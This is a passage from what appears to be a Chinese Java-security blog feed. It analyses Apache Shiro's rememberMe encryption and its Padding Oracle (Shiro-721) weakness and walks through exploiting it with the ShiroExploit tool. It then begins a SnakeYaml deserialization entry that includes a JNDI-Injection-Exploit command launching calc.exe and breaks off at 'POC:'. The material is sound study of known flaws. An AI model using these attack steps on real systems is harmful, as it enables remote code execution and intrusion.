<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Key <span class="title function_">generateNewKey</span><span class="params">(<span class="type">int</span> keyBitSize)</span> &#123;</span><br><span class="line">    KeyGenerator kg;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 根据算法名字初始化一个密钥生成器对象</span></span><br><span class="line">        kg = KeyGenerator.getInstance(getAlgorithmName());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to acquire &quot;</span> + getAlgorithmName() + <span class="string">&quot; algorithm.  This is required to function.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    kg.init(keyBitSize);</span><br><span class="line">    <span class="keyword">return</span> kg.generateKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903142908.png"><br>进入init方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> var1)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.init(var1, JceSecurity.RANDOM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的var1指的是key的长度，即128，调用重载方法init</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> var1, SecureRandom var2)</span> &#123;</span><br><span class="line">    <span class="comment">// var1表示key的大小</span></span><br><span class="line">    <span class="comment">// var2表示用于生成随机数的安全随机数生成器</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.serviceIterator == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.spi.engineInit(var1, var2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果&quot;serviceIterator&quot;不为null，表示有多个服务提供者实现可用。在这种情况下，会进入一个循环，不断尝试调用不同的服务提供者实现来初始化密钥生成器</span></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">KeyGeneratorSpi</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.spi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 初始化密钥生成器</span></span><br><span class="line">                var4.engineInit(var1, var2);</span><br><span class="line">                <span class="built_in">this</span>.initType = <span class="number">4</span>;</span><br><span class="line">                <span class="built_in">this</span>.initKeySize = var1;</span><br><span class="line">                <span class="built_in">this</span>.initParams = <span class="literal">null</span>;</span><br><span class="line">                <span class="built_in">this</span>.initRandom = var2;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var6) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var3 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    var3 = var6;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 取下一个可用的服务提供者实现</span></span><br><span class="line">                var4 = <span class="built_in">this</span>.nextSpi(var4, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (var4 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var3;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法主要是用于获取初始化密钥生成器<br>回到generateNewKey方法，初始化完成后，调用generateKey方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> SecretKey <span class="title function_">generateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.serviceIterator == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.spi.engineGenerateKey();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">KeyGeneratorSpi</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.spi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 生成密钥</span></span><br><span class="line">                <span class="keyword">return</span> var2.engineGenerateKey();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var4) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    var1 = var4;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var2 = <span class="built_in">this</span>.nextSpi(var2, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154420.png"><br>进入到engineGenerateKey方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> SecretKey <span class="title function_">engineGenerateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SecretKeySpec</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.random == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.random = SunJCE.getRandom();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] var2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="built_in">this</span>.keySize];</span><br><span class="line">    <span class="built_in">this</span>.random.nextBytes(var2);</span><br><span class="line">    var1 = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(var2, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154707.png"><br>随机生成相应长度的key后，返回SecretKeySpec对象<br>最后再回到AbstractRememberMeManager的构造函数使用getEncoded方法获取密钥序列</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncoded() &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">byte</span>[])<span class="built_in">this</span>.key.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Padding-Oracle-Attack攻击"><a href="#Padding-Oracle-Attack攻击" class="headerlink" title="Padding Oracle Attack攻击"></a>Padding Oracle Attack攻击</h3><p>原理：<a href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a><br><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a><br>这是一种类似于SQL盲注的攻击方法，所以需要寻找到返回结果的不同状态<br><strong>Padding错误时返回的状态</strong>：<br>回到AbstractRememberMeManager的解密函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照流程进入JcaCipherService类的decrypt方法，处理好iv和对应的密文后，进入重载的decrypt方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Attempting to decrypt incoming byte array of length &quot;</span> +</span><br><span class="line">                (ciphertext != <span class="literal">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="literal">null</span> ? <span class="literal">null</span> : ByteSource.Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入crypt方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(<span class="type">byte</span>[] bytes, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || key.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;key argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    javax.crypto.<span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> initNewCipher(mode, key, iv, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> crypt(cipher, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入重载方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(javax.crypto.Cipher cipher, <span class="type">byte</span>[] bytes) <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cipher.doFinal(bytes);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to execute &#x27;doFinal&#x27; with cipher instance [&quot;</span> + cipher + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了doFinal函数对字节码进行处理，步入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">byte</span>[] doFinal(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">    <span class="comment">// 检查加密器/解密器的状态</span></span><br><span class="line">    <span class="built_in">this</span>.checkCipherState();</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Null input buffer&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.chooseFirstProvider();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.spi.engineDoFinal(var1, <span class="number">0</span>, var1.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法会抛出两个异常，分别是IllegalBlockSizeException（块大小异常）和BadPaddingException（填充错误异常），这里使用的是throws，会将异常抛至上一层方法，逐层往上，直到getRememberedPrincipals方法中使用onRememberedPrincipalFailure进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入onRememberedPrincipalFailure方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">onRememberedPrincipalFailure</span><span class="params">(RuntimeException e, SubjectContext context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;There was a failure while trying to retrieve remembered principals.  This could be due to a &quot;</span> +</span><br><span class="line">                <span class="string">&quot;configuration problem or corrupted principals.  This could also be due to a recently &quot;</span> +</span><br><span class="line">                <span class="string">&quot;changed encryption key, if you are using a shiro.ini file, this property would be &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;securityManager.rememberMeManager.cipherKey&#x27; see: http://shiro.apache.org/web.html#Web-RememberMeServices. &quot;</span> +</span><br><span class="line">                <span class="string">&quot;The remembered identity will be forgotten and not used for this request.&quot;</span>;</span><br><span class="line">        log.warn(message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    forgetIdentity(context);</span><br><span class="line">    <span class="comment">//propagate - security manager implementation will handle and warn appropriately</span></span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此方法调用了forgetIdentity方法进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    getCookie().removeFrom(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>removeFrom方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeFrom</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> DELETED_COOKIE_VALUE;</span><br><span class="line">    <span class="type">String</span> <span class="variable">comment</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">//don&#x27;t need to add extra size to the response - comments are irrelevant for deletions</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">domain</span> <span class="operator">=</span> getDomain();</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> calculatePath(request);</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxAge</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//always zero for deletion</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> getVersion();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">secure</span> <span class="operator">=</span> isSecure();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">httpOnly</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//no need to add the extra text, plus the value &#x27;deleteMe&#x27; is not sensitive at all</span></span><br><span class="line"></span><br><span class="line">    addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line"></span><br><span class="line">    log.trace(<span class="string">&quot;Removed &#x27;&#123;&#125;&#x27; cookie by setting maxAge=0&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>removeForm主要在response头部添加字段Set-Cookie: rememberMe&#x3D;deleteMe</p>
<p><strong>Padding正确，反序列化失败</strong>：<br>在DefaultSerializer类的反序列化函数中进行了处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialize argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化<br><strong>两种状态</strong>：</p>
<ol>
<li>padding正确，服务器给出正确响应</li>
<li>padding错误，服务器返回Set-Cookie: rememberMe&#x3D;deleteMe</li>
</ol>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用工具ShiroExploit v2.51：<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51</a><br>输入网址及用户登录成功的Cookie<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904154417.png"><br>然后选择“使用ceye.io进行漏洞检测”，点击下一步开始攻击<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904155600.png"></p>
<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://goodapple.top/archives/261">Java反序列化漏洞——Shiro721 - 枫のBlog (goodapple.top)</a><br><a href="https://goodapple.top/archives/217">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析 - 枫のBlog (goodapple.top)</a><br><a href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">padding oracle和cbc翻转攻击 · sky’s blog (skysec.top)</a><br><a href="https://xz.aliyun.com/t/11633">Shiro 历史漏洞分析</a></p>
<blockquote>
<p>注：本文首发于<a href="https://xz.aliyun.com/t/13059">https://xz.aliyun.com/t/13059</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之SnakeYaml漏洞分析与利用</title>
    <url>/2023/04/22/SnakeYaml/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SnakeYaml是Java中解析yaml的库，而yaml是一种人类可读的数据序列化语言，通常用于编写配置文件等。</p>
<p><strong>yaml基本语法</strong>：</p>
<ul>
<li>大小写敏感</li>
<li>使用缩进表示层级关系</li>
<li>缩进只允许使用空格</li>
<li><code>#</code>表示注释</li>
<li>支持对象、数组、纯量这3种数据结构</li>
</ul>
<p><strong>示例</strong>：<br>yaml对象：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure>

<p>yaml数组：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">companies:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company1</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">200W</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company2</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">500W</span></span><br></pre></td></tr></table></figure>

<p>意思是 companies 属性是一个数组，每一个数组元素又是由 id、name、price 三个属性构成<br>详细参考：<a href="https://www.runoob.com/w3cnote/yaml-intro.html">https://www.runoob.com/w3cnote/yaml-intro.html</a></p>
<p><strong>SnakeYaml库</strong>：<br>SnakeYaml提供了yaml数据和Java对象相互转换的API，即能够对数据进行序列化与反序列化。</p>
<ul>
<li>Yaml.load():将yaml数据反序列化成一个Java对象</li>
<li>Yaml.dump():将Java对象序列化成yaml</li>
</ul>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>环境：JDK1.8_66<br>Maven导入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>序列化：</strong><br>Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;mike&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">!!SnakeYaml.Person &#123;age: <span class="number">18</span>, username: mike&#125;</span><br></pre></td></tr></table></figure>

<p>注：这里的!!应该类似于一个标识符，表示对应的类名<br>注：<strong>序列化过程会触发类属性对应的get方法</strong><br><strong>反序列化</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SnakeYaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SnakeYamlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;!!SnakeYaml.Person &#123;age: 18, username: mike&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) yaml.load(str);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SnakeYaml.Person@<span class="number">48533e64</span></span><br></pre></td></tr></table></figure>

<p>注：<strong>反序列化过程会触发类属性对应的set方法</strong></p>
<h1 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h1><h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p><strong>环境</strong>：SnakeYaml1.27   JDK1.8_66<br><strong>复现与分析</strong>：<br>使用工具开启LDAP服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p>POC:</p>
